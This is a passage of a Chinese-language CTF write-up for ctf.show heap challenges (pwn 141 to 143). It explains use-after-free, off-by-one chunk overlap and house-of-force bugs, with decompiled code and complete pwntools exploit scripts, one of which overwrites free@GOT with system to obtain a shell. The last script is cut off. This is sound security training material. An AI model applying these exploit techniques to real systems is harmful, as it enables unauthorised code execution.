<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        **((_DWORD **)&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = *((_DWORD *)&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(<span class="type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="number">4</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。</p>
<p>print_note():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MjNkZjRmZGQ2NmI1N2ExNjEwZGY2ODNlNjM3N2M2NmFfdDhIekhZSkFsaE5XT3FmV3VDdHJ3WUdnQzFudWNrME5fVG9rZW46SFJqV2JhMFpnb2d1UjV4R2dMWmNHU3d2bk9lXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>根据给定的索引来输出对应的note的内容。</p>
<p>del_note():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NTdlNzQzOTYyNGUwNzA5MmQyNGZjMDk5YWExZTk5NzNfRHBqUGd1TWJaRVhobXdyemJ6aGtKVWZnZHhId3VSQTVfVG9rZW46S01vNGJ0VzRUbzU1N2d4R1c2dmNiUnNibjZiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 UAF漏洞。</p>
<p>程序还存在后门函数use()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YWMxODEzMzdmNzU0ZjgwYjkwZDgyZDk0NjkxZTY0ZThfdG9zbkN4VHg2QjZDYkY0R0cxNjF0dEh1b3lMd1V4NVhfVG9rZW46UkVhS2JZcjlMb0tWRzF4QU1vUWNXY3F0blZmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>那么我们只需要修改 note 的 put 字段为use函数的地址，从而实现在执行 print note 的时候执行后门函数。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28234</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">use = elf.sym[<span class="string">&#x27;use&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>, p32(use))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-142"><a href="#pwn-142" class="headerlink" title="pwn 142"></a>pwn 142</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NTY0NDZmMzk5MTg0ZWU5OWJlMzZkOThkM2M3NGQwNTBfQ2VSTFlZNmhrSUtLRU9CZ3A5cFBvYlc4Rlh0ZTNPVDNfVG9rZW46VlROdGJDZXJKb3V5Yml4TDV0MmNEeEd0bnJiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位开启Canary，NX保护，部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzA0ZTVhN2IxMTk0Y2M0Y2QzYzQ0OWY3MDA2YTM3MTZfb1ZKWTJPbVBXWFFzVUg1RmVuOWVZRGVDNmF3eUVnOTVfVG9rZW46RDJrUWJ6MFFzb3RZZXV4Qzk1N2NYUEg0bkJoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>看一下菜单menu()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE1MmUyOGRjNjhmYzY0MDNlYjY5NGM5M2IwMjYyM2FfVE9uZXNIbHdQVkd3cHZoRHg5UGVtRFdzWUU5VkpER21fVG9rZW46R1Z0NWJXTDdRb0dnSE14SmF2QmNjRWI3blJnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>4个功能，分别是创建堆，编辑堆，打印堆，删除堆</p>
<p>create_heap()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0MDE1OThjYzgxOWE4ZDhhMzU5ZWMzM2IzMTQ3MGFfcFcwWTdkOHRSc0JVbEoyTEVCTWNoYlZwNkNOVWxRVjhfVG9rZW46Rmc1OWIxRmFNb3p3Y294WWRycWNGeTVMbkpkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>创建堆的时候，每次都会先创建0x10的heaparray，然后再创建堆</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNlOGZkNGQ0MjgzZDU3MzU5OWQzNzEyNTNlNjM5OGNfalNuYzI2UEJBNGpISGVFcUpSS0dxSDhOWnlDNVFweENfVG9rZW46V29CTWJEeVdqb0hKczF4WmJmbGNoblR1bkpjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MzU4NTgxZjAyNjg0MzMzYzI5OTVkMzYxMWQzZjVfcnFLTEpLSHFhQTRXeWNsUjlSbXNUMGJTMkVhOVhyZ3ZfVG9rZW46SkF1NmJOdFJRbzZ5elR4VFVEZGNzdzVCbkRjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>编辑的时候可以溢出一字节</p>
<p>show_heap()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ODk4OGVlNDljMDA3OTliZTNiNTkzYjBlNzI4MjNmNDJfRGVmeENrNTYza2hHWnJvNVlaeFBrenJSeGM1dWc5VHVfVG9rZW46TFlBM2JPNTRHb0Y0TjJ4Z2NPMmM5VW5yblY0XzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>delete_heap()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NjBlNmU4OGFmZTFiZDIyMzljZDY0MmM4ZGE3NGUzMTNfV05JTWFpZHBhd0QwSXc3U3Q3U3ZYbGsyZDl0Q0FmYk5fVG9rZW46SFBBbWJZTDM0b3VaOXd4Q1ZHdGNheFA5blVzXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>程序基本功能如上</p>
<p>我们就着重围绕着可以多写入一个字节，即存在off-by-one漏洞，可以通过溢出覆盖下一个字节，程序存在复用，即如果都inuse的话，上一个chunk可以使用到下一个chunk的prev_size，那么我们再溢出，就可以到size位了</p>
<p>（1）我们是首先申请了0x18字节（实际就给了0x10+下一个chunk的prev_size）</p>
<p>（2）然后再申请0x10</p>
<p>（3）edit第一个chunk，并且输入‘&#x2F;bin&#x2F;sh\x00’，通过栈溢出，将第二个chunk的size设置为0x41</p>
<p>（4）free掉第二个chunk</p>
<p>（5）重新申请0x30的chunk大小</p>
<p>（6）将free_got的地址输入chunk，并且打印出来</p>
<p>（7）计算出基地址、system地址</p>
<p>（8）覆盖free_got表为system地址</p>
<p>（9）删除第一个堆块即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28243</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;aaaa&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;bbbb&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-143"><a href="#pwn-143" class="headerlink" title="pwn 143"></a>pwn 143</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MzExNmFkNmQzNGE1NGNmYjFjNDE3ZWJjZTIxYjY5NjFfTHBiekt1RlFJeHpiaGJSTXBORWYzV1J5UVlTaTd6ajFfVG9rZW46QjlCUmI2UHpXb0haOEF4ZEhlcmM5c0h0bmFoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位程序，开启了Canary和NX,部分开启RELRO</p>
<p>IDA查看main函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MDI0Yjg0NmUzOWNkMTViNTc1YTRhY2JhNDgzYTY5ZDdfelhjemJueU1lRUlTdjlRTmZmUjVOM2F4UVVwNnpJNnRfVG9rZW46Wk85WWJyV2pub3lCVUd4YkFkMmN3MEJYbnZmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>看菜单menu()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQ4NWMxNTEzZTlkZTljNDNjMjYxYTVhYzhmYzc4ODlfZlBUT1JkU2ZHSDVLaHRSRHZka3ExSnlzUDJzbVFMZnBfVG9rZW46VTVWM2JSZ3Vxb3lPUFl4Y1hzTWN3MzZFbmJiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>一眼看到后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MjAwMzA0MTBkYmVlNTYyYWFjMmY2ZDZmMDliMTY0N2RfRldSUjdkd3RTTUVzMDY3SFZnWEpNcVhzMmtmOWVwVmJfVG9rZW46UUZlbmJoVTJsb1hWaWd4a0plcGNVVjQ2blhlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>fffffffffffffffffffffffffffffffffflag()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YTAwNDFhZmE3MWU3ZjUyMTdkNjVjZTkxODYwNjUzNGNfbzN4QXFidVRvM1VZQ20yVlJiVDBoMmIwWE5CeVlJUGtfVG9rZW46T2VmcWJVSGEzbzlDM0h4VWZRUWMySGQ2bnhlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>那么依据main函数，在输入5的时候会去执行v4[1]，v4[1]里面是goodbye_message的地址,我们通过house of force 的方法将其改为后门函数地址不就可以得到flag了</p>
<p>add():</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( num &gt; <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild length&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;<span class="built_in">list</span> + <span class="number">4</span> * i) = v2;</span><br><span class="line">        *((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * i) = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the name:&quot;</span>);</span><br><span class="line">        *(_BYTE *)(*((_QWORD *)&amp;unk_6020A8 + <span class="number">2</span> * i) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_6020A8 + <span class="number">2</span> * i), v2)) = <span class="number">0</span>;</span><br><span class="line">        ++num;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据输入的大小来申请对应的内存，作为其存储名字的空间。然后使用read读取输入参数是v2，而read的第三个参数是无符号整数，输入一个负数即可读取任意长度，但是我们需要确保该数值满足<code>REQUEST_OUT_OF_RANGE</code> 的约束，所以这里存在<strong>任意长度堆溢出</strong>的漏洞。但即使这样，第一次的时候也比较难以利用，因为初始时候堆的 top chunk 的大小一般是不会很大的。</p>
<p>edit():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NGRjYzc2YWEwNTNjY2Q3ZGRkYjU2ZWE4MGM1MmJhMDlfQWFFOFBudWtlalhlZGNBY0NTQnpJajBGT3lIdlo1TUZfVG9rZW46WlFvcmIwOWFIbzVRekV4d3RvR2M4NHVvbnJnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>修改chunk内容的时候，修改长度可控，没有检查原先chunk的size大小，当修改的size大于add时候的size即可溢出</p>
<p>也存在<strong>任意长度堆溢出</strong>的漏洞。</p>
<p>show():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFhMGE5NDQ2Yjg0YmM1YWZmZDFiZTJlZDNhNjdjNDBfMUdYU05sSkVnbDNsOEJ6WXUyVGtDTEpweG9pazRPSkJfVG9rZW46UnVBRWJsdFMzb3dHYUp4cXcwWmNybk9FbmZnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>打印对应chunk的内容</p>
<p>free():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZiNTllOWJmMTI5MTRiYzY5ZmZkYTEwYTg5MDg5NTRfTkFmaEhTUzJtRElDZm5oenZXRDhseHNkYnNoNHowVDhfVG9rZW46UkxyOWJoczJmbzRBRGZ4OTNpSWNpbVRVbmVoXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>该释放的都释放了，也将指针置0了，这里没有利用点。</p>
<p><strong>House of force</strong>的利用思路：</p>
<ol>
<li>通过house of force，将top chunk的地址移到记录goodbye_messaged的chunk0处</li>
<li>再次申请chunk，我们就能分配到chunk0</li>
<li>将goodbye_message改为后门函数的地址</li>
<li>输入5调用v4[1],即可获得flag</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 